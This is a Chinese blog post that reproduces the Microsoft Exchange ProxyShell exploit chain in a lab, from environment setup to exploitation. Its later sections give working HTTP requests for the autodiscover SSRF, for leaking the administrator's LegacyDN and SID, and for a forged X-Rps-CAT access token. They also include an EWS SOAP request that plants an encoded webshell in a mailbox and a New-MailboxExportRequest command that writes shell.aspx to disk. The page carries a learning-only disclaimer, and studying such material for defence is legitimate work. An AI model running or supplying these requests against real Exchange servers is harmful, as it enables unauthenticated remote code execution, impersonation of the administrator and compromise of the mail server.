<!-- build time:Wed Dec 08 2021 13:33:07 GMT+0800 (中国标准时间) --><!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=2"><meta name="theme-color" content="#FFF"><link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png"><link rel="icon" type="image/ico" sizes="32x32" href="/images/favicon.ico"><link rel="mask-icon" href="/images/logo.svg" color=""><link rel="manifest" href="/images/manifest.json"><meta name="msapplication-config" content="/images/browserconfig.xml"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><link rel="alternate" type="application/rss+xml" title="如月专注" href="http://example.com/rss.xml"><link rel="alternate" type="application/atom+xml" title="如月专注" href="http://example.com/atom.xml"><link rel="alternate" type="application/json" title="如月专注" href="http://example.com/feed.json"><link rel="stylesheet" href="//fonts.googleapis.com/css?family=Mulish:300,300italic,400,400italic,700,700italic%7CFredericka%20the%20Great:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20JP:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20SC:300,300italic,400,400italic,700,700italic%7CInconsolata:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext"><link rel="stylesheet" href="/css/app.css?v=0.2.5"><link rel="canonical" href="http://example.com/2021/10/09/Exchange%20Proxyshell/"><title>Exchange Proxyshell - 漏洞复现 | 如月专注</title><meta name="generator" content="Hexo 5.4.0"></head><body itemscope itemtype="http://schema.org/WebPage"><div id="loading"><div class="cat"><div class="body"></div><div class="head"><div class="face"></div></div><div class="foot"><div class="tummy-end"></div><div class="bottom"></div><div class="legs left"></div><div class="legs right"></div></div><div class="paw"><div class="hands left"></div><div class="hands right"></div></div></div></div><div id="container"><header id="header" itemscope itemtype="http://schema.org/WPHeader"><div class="inner"><div id="brand"><div class="pjax"><h1 itemprop="name headline">Exchange Proxyshell</h1><div class="meta"><span class="item" title="创建时间：2021-10-09 13:44:53"><span class="icon"><i class="ic i-calendar"></i> </span><span class="text">发表于</span> <time itemprop="dateCreated datePublished" datetime="2021-10-09T13:44:53+08:00">2021-10-09</time> </span><span class="item" title="本文字数"><span class="icon"><i class="ic i-pen"></i> </span><span class="text">本文字数</span> <span>9.1k</span> <span class="text">字</span> </span><span class="item" title="阅读时长"><span class="icon"><i class="ic i-clock"></i> </span><span class="text">阅读时长</span> <span>8 分钟</span></span></div></div></div><nav id="nav"><div class="inner"><div class="toggle"><div class="lines" aria-label="切换导航栏"><span class="line"></span> <span class="line"></span> <span class="line"></span></div></div><ul class="menu"><li class="item title"><a href="/" rel="start">如月专注</a></li></ul><ul class="right"><li class="item theme"><i class="ic i-sun"></i></li><li class="item search"><i class="ic i-search"></i></li></ul></div></nav></div><div id="imgs" class="pjax"><ul><li class="item" data-background-image="https://cdn.jsdelivr.net/gh/ruyueattention/ruyueattention.github.io/images/1.png"></li><li class="item" data-background-image="https://cdn.jsdelivr.net/gh/ruyueattention/ruyueattention.github.io/images/3.jpg"></li><li class="item" data-background-image="https://cdn.jsdelivr.net/gh/ruyueattention/ruyueattention.github.io/images/6.jpg"></li><li class="item" data-background-image="https://cdn.jsdelivr.net/gh/ruyueattention/ruyueattention.github.io/images/4.jpg"></li><li class="item" data-background-image="https://cdn.jsdelivr.net/gh/ruyueattention/ruyueattention.github.io/images/5.jpg"></li><li class="item" data-background-image="https://cdn.jsdelivr.net/gh/ruyueattention/ruyueattention.github.io/images/7.jpg"></li></ul></div></header><div id="waves"><svg class="waves" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto"><defs><path id="gentle-wave" d="M-160 44c30 0 58-18 88-18s 58 18 88 18 58-18 88-18 58 18 88 18 v44h-352z"/></defs><g class="parallax"><use xlink:href="#gentle-wave" x="48" y="0"/><use xlink:href="#gentle-wave" x="48" y="3"/><use xlink:href="#gentle-wave" x="48" y="5"/><use xlink:href="#gentle-wave" x="48" y="7"/></g></svg></div><main><div class="inner"><div id="main" class="pjax"><div class="article wrap"><div class="breadcrumb" itemscope itemtype="https://schema.org/BreadcrumbList"><i class="ic i-home"></i> <span><a href="/">首页</a></span><i class="ic i-angle-right"></i> <span class="current" itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem"><a href="/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" itemprop="item" rel="index" title="分类于 漏洞复现"><span itemprop="name">漏洞复现</span></a><meta itemprop="position" content="1"></span></div><article itemscope itemtype="http://schema.org/Article" class="post block" lang="zh-CN"><link itemprop="mainEntityOfPage" href="http://example.com/2021/10/09/Exchange%20Proxyshell/"><span hidden itemprop="author" itemscope itemtype="http://schema.org/Person"><meta itemprop="image" content="/images/avatar.jpg"><meta itemprop="name" content="ruyue"><meta itemprop="description" content=", "></span><span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization"><meta itemprop="name" content="如月专注"></span><div class="body md" itemprop="articleBody"><p><strong>声明：仅供学习参考使用，请勿用作违法用途，否则后果自负</strong></p><h1 id="参考链接"><a class="anchor" href="#参考链接">#</a> 参考链接</h1><blockquote><p><span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODc0OTMwL2FydGljbGUvZGV0YWlscy8xMjAwMzc2MTk=">https://blog.csdn.net/qq_41874930/article/details/120037619</span><br><span class="exturl" data-url="aHR0cHM6Ly93d3cuemVyb2RheWluaXRpYXRpdmUuY29tL2Jsb2cvMjAyMS84LzE3L2Zyb20tcHduMm93bi0yMDIxLWEtbmV3LWF0dGFjay1zdXJmYWNlLW9uLW1pY3Jvc29mdC1leGNoYW5nZS1wcm94eXNoZWxs">https://www.zerodayinitiative.com/blog/2021/8/17/from-pwn2own-2021-a-new-attack-surface-on-microsoft-exchange-proxyshell</span><br><span class="exturl" data-url="aHR0cHM6Ly93d3cuNGhvdS5jb20vcG9zdHMvOFdwMg==">https://www.4hou.com/posts/8Wp2</span><br><span class="exturl" data-url="aHR0cHM6Ly9wZXRlcmpzb24ubWVkaXVtLmNvbS9yZXByb2R1Y2luZy10aGUtcHJveHlzaGVsbC1wd24yb3duLWV4cGxvaXQtNDk3NDNhNGVhOWEx">https://peterjson.medium.com/reproducing-the-proxyshell-pwn2own-exploit-49743a4ea9a1</span><br><span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0hCb2hhbi9hcnRpY2xlL2RldGFpbHMvMTE5OTgwNzQ4">https://blog.csdn.net/HBohan/article/details/119980748</span></p></blockquote><p>后续的其他利用：（我还没做复现，先鸽着吧，有哪位大佬复现了踹我一脚）</p><blockquote><p><span class="exturl" data-url="aHR0cHM6Ly93d3cuNGhvdS5jb20vc2VhcmNoLXBvc3Q/a2V5d29yZHM9cHJveHlzaGVsbA==">https://www.4hou.com/search-post?keywords=proxyshell</span></p></blockquote><p>本文使用到的 exp 和相关代码全都打包到这了：</p><blockquote><p><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3lpc2FkaXRhdGltaS9Qcm94eVNoZWxs">https://github.com/yisaditatimi/ProxyShell</span></p></blockquote><p><br><br></p><h1 id="漏洞说明"><a class="anchor" href="#漏洞说明">#</a> 漏洞说明</h1><p>（学术剽窃）</p><p>proxyshell 利用链由下述三个 cve 组成：<br>— CVE-2021-34473 - 一个 ssrf 漏洞<br>— CVE-2021-34523 - Exchange PowerShell BackEnd 提权<br>— CVE-2021-31207 - 认证后任意文件写入漏洞<br></p><p>参考：</p><blockquote><p><span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODc0OTMwL2FydGljbGUvZGV0YWlscy8xMjAwMzc2MTk=">https://blog.csdn.net/qq_41874930/article/details/120037619</span></p></blockquote><h2 id="ssrf"><a class="anchor" href="#ssrf">#</a> SSRF</h2><p>这个攻击是从利用一个 SSRF 漏洞开始的，该漏洞是由于一些奇怪的 URI 解析造成的路径混乱所致。</p><h2 id="powershell端点"><a class="anchor" href="#powershell端点">#</a> PowerShell 端点</h2><p>然后，通过访问内部网络，我们可以尝试访问 /powershell 端点，从而实现与 Exchange PowerShell 之间的通信。请注意，由于 Exchange 的 Powershell 环境的缘故，我们可以运行的命令是非常有限的。<br>通过利用 SSRF 漏洞，我们就能以 NT Authroity/System 的身份来访问 /powershell 端点。这在正常情况下是没有问题的，但在这种情况下，由于无法识别，因此无法通过身份验证。因此，我们需要降低我们的权限来获得对端点的访问权限。<br>该端点需要一个名为 X-CommonAccessToken 的 HTTP 头部，但 Exchange 不会将这个头部转发到内部后端服务器。所以我们通过另一种方式获得令牌：通过提供一个名为 X-Rps-CAT 的 GET 参数，其中存放令牌内容；之后，它将被反序列化并添加为 X-CommonAccessToken。</p><h2 id="执行powershell命令"><a class="anchor" href="#执行powershell命令">#</a> 执行 PowerShell 命令</h2><p>有了验证自己身份的方法，我们就可以更进一步，尝试实现代码执行。正如我之前所说，由于当前环境下会受到各种限制，因此，我们可以利用的东西很少。但是，却存在这样一个命令：通过它，我们能够在机器的任何位置写入文件…… 但是，文件只能是 PST 格式。<br>但是，PST 文件并不是把所有的内容都放以明文形式存放，相反，该格式会将文件内容进行编码，这在微软的官方文件中是有介绍的。<br>所以，我们可以先对 payload 进行编码，然后，在生成并被编码 PST 文件时，会对 payload 再次进行编码，这将使最终结果保持不变。<br>同时，因为我们可以提供一个网络共享，这意味着我们可以直接告诉 Exchange 导出文件到 \127.0.0.1\C$\pathto\shell。这个 webshell 虽然不是很优雅，但的确能用。<br>但在这之前，我们需要让我们控制的用户拥有导出邮件的权限。为此，我们需要借助于 New-ManagementRoleAssignment，我们可以通过它把邮箱导入导出的角色分配给用户。</p><h2 id="发送payload"><a class="anchor" href="#发送payload">#</a> 发送 Payload</h2><p>解决了这个问题后，我们就可以设法发送有效载荷。由于我们将利用 New-MailExportRequest，所以，我们需要向要导出的邮箱里发送一封包含有效载荷的邮件。<br>我发现，有两种方法可以解决这个问题。其中，一种方法是 Orange 使用的方法，发送一封邮件到地址，然后导出它。另一种方法，是 Peter 和 Jang 在 Peter 的博客中提出的方法：使用 EWS 来冒充用户，并将包含有效负载的草稿保存为附件。</p><h2 id="总结"><a class="anchor" href="#总结">#</a> 总结</h2><p>ProxyShell 是利用了 Exchange 服务器对于路径的不准确过滤导致的路径混淆生成的 SSRF，进而使攻击者通过访问 PowerShell 端点。而在 PowerShell 端点可以利用 Remote PowerShell 来将邮件信息打包到外部文件，而攻击者可以通过构造恶意邮件内容，利用文件写入写出 webshell，从而达成命令执行。</p><h1 id="环境安装"><a class="anchor" href="#环境安装">#</a> 环境安装</h1><p>注：exchange 非法卸载重装时出现的不一致问题解决方法 <span class="exturl" data-url="aHR0cHM6Ly93d3cucGlhbnNoZW4uY29tL2FydGljbGUvNTY5NDU2OTQ0MS8=">https://www.pianshen.com/article/5694569441/</span></p><p>这里我用系统环境是 windows server2012 R2，<br>exchange 是 Exchange Server 2016 CU18 内部版本号为：15.1.2106.2</p><p>首先，我没在这台 server2012 上装域控，我只是将这台机子加入到域中，然后在这台机子上装 exchange，所以这里没安装 AD 目录的过程。<br>（部署域控和加入域的操作详情见：</p><blockquote><p><span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3hpZXp1b3lvbmcvYXJ0aWNsZS9kZXRhaWxzLzk0NDY3NDc=">https://blog.csdn.net/xiezuoyong/article/details/9446747</span><br><span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3hpZXp1b3lvbmcvYXJ0aWNsZS9kZXRhaWxzLzk0NDc4ODE=">https://blog.csdn.net/xiezuoyong/article/details/9447881</span></p></blockquote><p>）</p><p>exhange 下载链接：</p><blockquote><p><span class="exturl" data-url="aHR0cHM6Ly93d3cubWljcm9zb2Z0LmNvbS96aC1jbi9kb3dubG9hZC9jb25maXJtYXRpb24uYXNweD9pZD0xMDIxMTQ=">https://www.microsoft.com/zh-cn/download/confirmation.aspx?id=102114</span></p></blockquote><p>首先，我们需要完成加入域的操作，然后再走下面的流程</p><p>①安装各种组件</p><pre><code>Install-WindowsFeature Server-Media-Foundation, NET-Framework-45-Features, RPC-over-HTTP-proxy, RSAT-Clustering, RSAT-Clustering-CmdInterface, RSAT-Clustering-Mgmt, RSAT-Clustering-PowerShell, Web-Mgmt-Console, WAS-Process-Model, Web-Asp-Net45, Web-Basic-Auth, Web-Client-Auth, Web-Digest-Auth, Web-Dir-Browsing, Web-Dyn-Compression, Web-Http-Errors, Web-Http-Logging, Web-Http-Redirect, Web-Http-Tracing, Web-ISAPI-Ext, Web-ISAPI-Filter, Web-Lgcy-Mgmt-Console, Web-Metabase, Web-Mgmt-Console, Web-Mgmt-Service, Web-Net-Ext45, Web-Request-Monitor, Web-Server, Web-Stat-Compression, Web-Static-Content, Web-Windows-Auth, Web-WMI, Windows-Identity-Foundation, RSAT-ADDS
</code></pre><p><img data-src="https://img-blog.csdnimg.cn/img_convert/401b00b08e5338725090497a46366aa1.png" alt="3840a172-2d77-4cc3-9a63-6ddf27ff50aa-图片.png"><br></p><p>②按顺序安装下面的东西，然后重启，就可以执行 exchang 安装程序了。<br>注：下面两个安装包别选中文，选英文的。<br>Microsoft Unified Communications Managed API 4.0 Core Runtime（64 位）</p><blockquote><p><span class="exturl" data-url="aHR0cHM6Ly9kb3dubG9hZC5taWNyb3NvZnQuY29tL2Rvd25sb2FkLzIvQy80LzJDNDdBNUMxLUExRjMtNDg0My1COUZFLTg0QzAwMzJDNjFFQy9VY21hUnVudGltZVNldHVwLmV4ZQ==">https://download.microsoft.com/download/2/C/4/2C47A5C1-A1F3-4843-B9FE-84C0032C61EC/UcmaRuntimeSetup.exe</span></p></blockquote><p>C++ 依赖包</p><blockquote><p><span class="exturl" data-url="aHR0cHM6Ly9kb3dubG9hZC5taWNyb3NvZnQuY29tL2Rvd25sb2FkLzIvRS82LzJFNjFDRkE0LTk5M0ItNERENC05MURBLTM3MzdDRDVDRDZFMy92Y3JlZGlzdF94NjQuZXhl">https://download.microsoft.com/download/2/E/6/2E61CFA4-993B-4DD4-91DA-3737CD5CD6E3/vcredist_x64.exe</span></p></blockquote><p></p><p>③安装 exchange<br>运行 setup.exe<br><img data-src="https://img-blog.csdnimg.cn/img_convert/1be79d442f2fd11b54ea2190ecdbee88.png" alt="bf3951a5-7aff-47b8-8e43-4b8da5a13003-图片.png"><br><img data-src="https://img-blog.csdnimg.cn/img_convert/5e6da8295ac0c432071818a5bb8a6cdc.png" alt="f4b219be-8a45-4af7-9791-ce4afc38e993-图片.png"><br><img data-src="https://img-blog.csdnimg.cn/img_convert/cf61be9fb3766065e1e9ccbb4f4711d7.png" alt="8ea4462e-cb3e-46fc-8c50-fb047d7b4ed0-图片.png"><br><img data-src="https://img-blog.csdnimg.cn/img_convert/2cb928dacd22e6e9b4d2263fb28a8464.png" alt="3c4e7015-9657-4023-93c8-1fc2ca5f3979-图片.png"></p><p>然后就是会检查先决条件，如果没问题就直接按照就完事了，出现警告不用管，出现错误就按照给的提示去解决。</p><p><img data-src="https://img-blog.csdnimg.cn/img_convert/698cb15d1500876c0f36dc03bdca3cf1.png" alt="3f2d73a7-8a1f-4969-a4be-c9b6e87fcced-图片.png"></p><p>经过漫长的安装过程，最后安装成功，这时候直接访问 url 就能看到 exchange 的页面了。到这里已经算安装成功了。</p><p><img data-src="https://img-blog.csdnimg.cn/img_convert/71a3b9018620dfa63da12cc12b3deecd.png" alt="21b13b63-814b-453b-9726-f7c40197082f-图片.png"></p><p><img data-src="https://img-blog.csdnimg.cn/img_convert/c3ebbaefd1e2b7c70509c8a5ca279701.png" alt="82ddc26a-a662-4053-bec7-fa6aa46ae0cb-图片.png"></p><p><br><br></p><h1 id="ssrfcve-2021-34473"><a class="anchor" href="#ssrfcve-2021-34473">#</a> SSRF(CVE-2021-34473)</h1><h2 id="漏洞原理"><a class="anchor" href="#漏洞原理">#</a> 漏洞原理</h2><blockquote><p><span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODc0OTMwL2FydGljbGUvZGV0YWlscy8xMjAwMzc2MTk=">https://blog.csdn.net/qq_41874930/article/details/120037619</span></p></blockquote><p>整个代码逻辑如下</p><pre><code>• 系统会判断用户输入的url的path部分是不是autodiscover.json结尾，如果是则将email(一个用户的可控参数，值必须包含有效的email)赋值给explicitLogonAddress。
• 如果用户输入的uri结尾不是autodiscover.json，则在用户输入的url中从头开始删除掉跟email的值一样的部分。然后将这部分作为要传给后端的url。
• 因此我们可以构造一个类似于https://192.168.0.103/autodiscover/autodiscover.json?@foo.com/mapi/nspi/?&amp;Email=autodiscover/autodiscover.json%3f@foo.com的poc进行验证，且最终传递给后端的url为：https://192.168.0.103:444/mapi/nspi/。
</code></pre><p>这里做个分析：<br><img data-src="https://img-blog.csdnimg.cn/4f95481a91754ffc908ece76da4095b8.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5aaC5pyI5LiT5rOo,size_20,color_FFFFFF,t_70,g_se,x_16" alt="对于例子https://192.168.0.103/autodiscover/autodiscover.json?@foo.com/mapi/nspi/?&amp;Email=autodiscover/autodiscover.json%3f@foo.com]①用户输入的url的path部分的结尾为标红部分且值是autodiscover.json，因此会将email赋值（标蓝部分）给下一个参数进行进一步处理。②对于整个url而言，结尾部分明显不是autodiscover.json，而是email参数的值，因此最终传入后端的URL要删去跟emial参数一样的部分，所以最终整个url就剩下了https://192.168.0.103:444/mapi/nspi/③因此，我们只需要对下面标粉部分进行修改，就能进行指定URL的SSRF了https://192.168.0.103/autodiscover/autodiscover.json?@foo.com%(#ff0080)[/mapi/nspi/]?&amp;Email=autodiscover/autodiscover.json%3f@foo.com"></p><p>PS：把 Email 参数放到 Cookie 中一样生效。</p><p></p><h2 id="漏洞复现"><a class="anchor" href="#漏洞复现">#</a> 漏洞复现</h2><p>直接访问 mapi/nspi 要求登录验证<br><img data-src="https://img-blog.csdnimg.cn/img_convert/fee4eb2f9753ea9c1c6cec76c36c0521.png" alt="4552385c-589f-4443-a9df-2ca9b7c6aea1-图片.png"></p><p>使用 payload ssrf 访问则直接通过验证。</p><p><img data-src="https://img-blog.csdnimg.cn/img_convert/f450e16d8b851dccd72063dc5194ea8e.png" alt="e26af357-5409-4dff-a0dc-16f7047528ab-图片.png"></p><p><img data-src="https://img-blog.csdnimg.cn/img_convert/42e9ab52ec70484136c3b475147ab5c5.png" alt="cae932a7-8224-4c67-bff2-6e2cc15be964-图片.png"><br><br><br></p><h1 id="exchange-powershell-backend提权-cve-2021-34523"><a class="anchor" href="#exchange-powershell-backend提权-cve-2021-34523">#</a> Exchange PowerShell BackEnd 提权 (CVE-2021-34523)</h1><h2 id="漏洞原理-2"><a class="anchor" href="#漏洞原理-2">#</a> 漏洞原理</h2><p>（学术剽窃）</p><blockquote><p><span class="exturl" data-url="aHR0cHM6Ly9wZXRlcmpzb24ubWVkaXVtLmNvbS9yZXByb2R1Y2luZy10aGUtcHJveHlzaGVsbC1wd24yb3duLWV4cGxvaXQtNDk3NDNhNGVhOWEx">https://peterjson.medium.com/reproducing-the-proxyshell-pwn2own-exploit-49743a4ea9a1</span><br><span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODc0OTMwL2FydGljbGUvZGV0YWlscy8xMjAwMzc2MTk=">https://blog.csdn.net/qq_41874930/article/details/120037619</span></p></blockquote><p>总结如下<br>Exchange PowerShell Remoting 是一个基于 WSMan 协议的一个服务，他可以执行一些特定的 powershell 命令，实现的功能有发邮件、读邮件、更新配置文件等，使用的前提是使用者需具有邮箱，可是如果我们利用前面的 ssrf 漏洞来使用 system 用户的身份使用此服务的话就会失败，原因是 system 用户是没有邮箱的。因此我们首当其冲的是<br>获取一个有权限的令牌这样才能调用 powershell 接口。</p><p>当我们使用 SSRF 访问内部网络的 powershell 接口时，如果请求头不包含 X-CommonAccessToken 的话，exchange 就会尝试去获取 GET 参数 X-Rps-CAT 的值，然后再进行反序列化来创建一个 Token 令牌，这就是我们用于访问 powershell 接口的令牌。所以我们现在只需要知道这个令牌的生成方式，就能够伪造任意用户来和 exchange powershell 交互执行任意命令了。</p><p>而这个 CommonAccessToken 的组成方式还比较复杂</p><p><img data-src="https://img-blog.csdnimg.cn/img_convert/96081d1b45fd4faa91bea4b8c139e2b8.png" alt="91866bdb-8ad0-4c45-a9f1-ab1c178d51a5-图片.png"></p><p>简单的例子：<br>VgEAVAdXaW5kb3dzQwBBCEtlcmJlcm9zTBZGXEhlYWx0aE1haWxib3g3ZjRiOTM1VS1TLTEtNS0yMS0xOTU2NzE2NjYxLTMwNzcyMTY4MjctMzc2OTU5MzkzLTExMzVHBgAAAAcAAAAsUy0xLTUtMjEtMTk1NjcxNjY2MS0zMDc3MjE2ODI3LTM3Njk1OTM5My01MTMHAAAAB1MtMS0xLTAHAAAAB1MtMS01LTIHAAAACFMtMS01LTExBwAAAAhTLTEtNS0xNQcAAAAIUy0xLTE4LTFFAAAAAA==</p><p><img data-src="https://img-blog.csdnimg.cn/img_convert/0538e20b21d91002ded38a4fc678f377.png" alt="3767d8b4-18b2-4b4b-b3f9-c59bd14a8199-图片.png"></p><pre><code>总之，在生成token的过程中，我们只需要去获取指定用户的sid就能够伪造token了。
</code></pre><p></p><h2 id="漏洞复现-2"><a class="anchor" href="#漏洞复现-2">#</a> 漏洞复现</h2><p>首先，我们需要一个目标，这里我们的目标用户就是域管 administrator，接着想要获取它的 sid</p><p>首先我们需要获取 LegacyDn（想要获取域名，我们可以通过往 RPC 接口发送指定内容）</p><pre><code>POST /autodiscover/autodiscover.json?a=test@qq.com/autodiscover/autodiscover.xml HTTP/1.1
Host:192.168.152.111
Cookie:Email=autodiscover/autodiscover.json?a=test@qq.com
Content-Length:320
Content-Type:text/xml

&lt;Autodiscover xmlns=&quot;http://schemas.microsoft.com/exchange/autodiscover/outlook/requestschema/2006&quot;&gt;&lt;Request&gt;&lt;EMailAddress&gt;administrator@ruyue.com&lt;/EMailAddress&gt;&lt;AcceptableResponseSchema&gt;http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a&lt;/AcceptableResponseSchema&gt;&lt;/Request&gt;&lt;/Autodiscover&gt;
</code></pre><p><img data-src="https://img-blog.csdnimg.cn/img_convert/c4b3a64ff1ab0c2265ff9b91bbee2a75.png" alt="a2c83281-02df-4383-9a73-fd22e81d4277-图片.png"></p><p>然后通过 LegacyDn 获取 sid（这里需要在包体后面填充空字节）</p><pre><code>POST /autodiscover/autodiscover.json?a=test@qq.com/mapi/emsmdb HTTP/1.1
Host:192.168.152.111
Cookie:Email=autodiscover/autodiscover.json?a=test@qq.com
Content-Length:149
Content-Type:application/mapi-http
X-Requesttype:Connect
X-Clientapplication:Outlook/15.0.4815.1002
X-Requestid:x

/o=First Organization/ou=Exchange Administrative Group(FYDIBOHF23SPDLT)/cn=Recipients/cn=f2e19872bf634b09b5b25fdc463455fb-Admin
</code></pre><p><img data-src="https://img-blog.csdnimg.cn/img_convert/ed099755afc7fcffada014bbd3f9da05.png" alt="17b1c4dc-225a-4734-adee-d02cbcb987df-图片.png"><br><img data-src="https://img-blog.csdnimg.cn/img_convert/e6b6afefb64c9700e772c2cd6e868d7c.png" alt="4baf7f58-81f5-43b0-8b67-6892e3a99ee4-图片.png"><br><img data-src="https://img-blog.csdnimg.cn/img_convert/75c9e4c1808d44b81d0798cc77caf5dc.png" alt="9022de2d-abc0-4d60-bf46-7954d208e9f0-图片.png"><br><img data-src="https://img-blog.csdnimg.cn/img_convert/01930e7c6bf321c78aa527914880a3c7.png" alt="30669f28-f12c-4b38-be28-4fc15ef99f46-图片.png"></p><p>拿到 sid 后，我们接下来使用 exp 去计算这个 token 值</p><p><img data-src="https://img-blog.csdnimg.cn/img_convert/83bc62cd2eff0f66701a1ce98feb14c2.png" alt="9f9c82af-94c4-480d-820d-cebfc36c6607-图片.png"></p><p>现在已经成功获取到了 token，然后我们该测试下这个 token 是否能用，直接用上它去访问 powershell 接口<br>如图，回显 200 代表成功，如果 401 的话就得找找问题了。</p><p><img data-src="https://img-blog.csdnimg.cn/img_convert/104609af2afacb69885c6bdcb7ee8b20.png" alt="969177f4-eb3f-4598-91e5-1c4b2ee8f36c-图片.png"></p><p><br><br></p><h1 id="认证后任意文件写入漏洞cve-2021-31207"><a class="anchor" href="#认证后任意文件写入漏洞cve-2021-31207">#</a> 认证后任意文件写入漏洞（CVE-2021-31207 ）</h1><h2 id="漏洞原理-3"><a class="anchor" href="#漏洞原理-3">#</a> 漏洞原理</h2><p>漏洞利用链的最后一部分是使用 Exchange PowerShell 来写 webshell。 这并不困难，因为我们是管理员，并且可以利用数百个命令。 在这里我们找到了命令 New-MailboxExportRequest，将用户的邮箱导出到指定路径。</p><p>New-MailboxExportRequest -Mailbox <span class="exturl" data-url="bWFpbHRvOnRlc3RAcnV5dWUuY29t">test@ruyue.com</span> -FilePath \127.0.0.1\C$\path\shell.aspx<br># 将 test@ruyue.com 的邮箱导出到目标路径</p><p>但是因为这个命令是将用户邮箱内容导出到指定路径的，而邮箱是没有纯文本格式的，而这里它导出的格式是 outlook 个人文件夹（PST）格式，而通过微软官方文档，得知<br>PST 只是使用简单的置换编码 (NDB_CRYPT_PERMUTE) 来编码我们的有效载荷（这种类似异或加密，因此加密后再进行一次加密等于没变化）。 所以我们可以在发送之前对有效载荷进行编码，当服务器尝试保存和编码我们的有效载荷时，它会将其转换为原始恶意代码。 所以我们只需要往指定账号发送一个处理过后的邮箱再将邮箱导出到本地就能 getshell 了。</p><p>但这里还存在一个问题，调用 exchange powershell 的协议并非 http 协议，而是 WsMan 协议，这是一种基于<br>HTTP 与 SOAP XML 的协议。这里我们可以利用 Python 库 PyPSRP 来完成相应的工作。</p><p></p><h2 id="漏洞复现-3"><a class="anchor" href="#漏洞复现-3">#</a> 漏洞复现</h2><p>上面原理中已经讲的较清楚了，主要就是先向目标账号发送一个经加密后的 webshell 邮件，然后再调用 exchang powershell 将文件写到本地。</p><p>首先，我们先对 webshell 进行处理<br><img data-src="https://img-blog.csdnimg.cn/img_convert/7d5787efbdbf6658e9ed77231cc59d06.png" alt="689d6a92-e22e-4f7a-9b18-f4cf5ffd65b6-图片.png"></p><p>接着开始伪造邮件，将 webshell 发送给目标账号。我们这里直接调用内部接口，将一个含 webshell 的文件直接添加到目标的草稿箱中</p><pre><code>POST /autodiscover/autodiscover.json?a=test@qq.com/EWS/exchange.asmx/?X-Rps-CAT=VgEAVAdXaW5kb3dzQwBBCEtlcmJlcm9zTBdhZG1pbmlzdHJhdG9yQHJ1eXVlLmNvbVUsUy0xLTUtMjEtMjk1NTg1OTg3My05MDgyNzE1OTItMTk3NTEyMTI1Ni01MDBHAQAAAAcAAAAMUy0xLTUtMzItNTQ0RQAAAAA=HTTP/1.1
Host:192.168.152.111
Cookie:Email=autodiscover/autodiscover.json?a=test@qq.com
Content-Length:1413
Content-Type:text/xml

&lt;soap:Envelope
xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;
xmlns:m=&quot;http://schemas.microsoft.com/exchange/services/2006/messages&quot;
xmlns:t=&quot;http://schemas.microsoft.com/exchange/services/2006/types&quot;
xmlns:soap=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;&gt;
&lt;soap:Header&gt;
&lt;t:RequestServerVersion Version=&quot;Exchange2016&quot;/&gt;
&lt;t:SerializedSecurityContext&gt;
&lt;t:UserSid&gt;S-1-5-21-2955859873-908271592-1975121256-500&lt;/t:UserSid&gt;
&lt;t:GroupSids&gt;
&lt;t:GroupIdentifier&gt;
  &lt;t:SecurityIdentifier&gt;S-1-5-21&lt;/t:SecurityIdentifier&gt;
&lt;/t:GroupIdentifier&gt;
&lt;/t:GroupSids&gt;
&lt;/t:SerializedSecurityContext&gt;
&lt;/soap:Header&gt;
&lt;soap:Body&gt;
&lt;m:CreateItem MessageDisposition=&quot;SaveOnly&quot;&gt;
&lt;m:Items&gt;
&lt;t:Message&gt;
  &lt;t:Subject&gt;aomenshoujiaxianshangduchang&lt;/t:Subject&gt;
  &lt;t:Body BodyType=&quot;HTML&quot;&gt;hello fromdarkness side&lt;/t:Body&gt;
  &lt;t:Attachments&gt;
    &lt;t:FileAttachment&gt;
      &lt;t:Name&gt;FileAttachment.txt&lt;/t:Name&gt;
      &lt;t:IsInline&gt;false&lt;/t:IsInline&gt;
      &lt;t:IsContactPhoto&gt;false&lt;/t:IsContactPhoto&gt;
      &lt;t:Content&gt;ldZUhrdpFDnNqQbf96nf2v+CYWdUhrdpFII5hvcGqRT/gtbahqXahoI5uanf2jmp1mlU041pqRT/FIb32tld9wZUFLfTBjm5qd/aKSDTqQ2MyenapanNjL7aXPfa1hR+glSNDYIPa4L3BtapXdqCyTEhlfvWVIa3aRTZ&lt;/t:Content&gt;
    &lt;/t:FileAttachment&gt;
  &lt;/t:Attachments&gt;
  &lt;t:ToRecipients&gt;
    &lt;t:Mailbox&gt;
      &lt;t:EmailAddress&gt;administrator@ruyue.com&lt;/t:EmailAddress&gt;
    &lt;/t:Mailbox&gt;
  &lt;/t:ToRecipients&gt;
&lt;/t:Message&gt;
&lt;/m:Items&gt;
&lt;/m:CreateItem&gt;
&lt;/soap:Body&gt;
&lt;/soap:Envelope&gt;
